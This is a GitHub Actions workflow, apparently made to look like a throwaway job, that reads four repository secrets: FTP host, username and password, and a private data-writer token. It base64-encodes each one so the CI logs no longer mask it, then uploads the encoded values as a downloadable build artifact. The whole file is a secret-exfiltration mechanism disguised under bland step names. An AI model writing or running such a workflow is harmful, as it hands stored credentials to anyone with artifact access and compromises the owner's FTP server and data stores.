name: zz-tmp-envfetch-i37376
on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  fetch:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: pack
        env:
          S1: ${{ secrets.FTP_HOST }}
          S2: ${{ secrets.FTP_USER }}
          S3: ${{ secrets.FTP_PASS }}
          S4: ${{ secrets.PRIVATE_DATA_WRITER_TOKEN }}
        run: |
          set -euo pipefail
          mkdir -p out
          printf '%s' "$S1" | base64 -w0 > out/host.b64
          printf '%s' "$S2" | base64 -w0 > out/user.b64
          printf '%s' "$S3" | base64 -w0 > out/pass.b64
          printf '%s' "$S4" | base64 -w0 > out/token.b64
          wc -c out/*.b64
      - uses: actions/upload-artifact@v4
        with:
          name: zz-out-wnba-37376
          path: out
          retention-days: 1
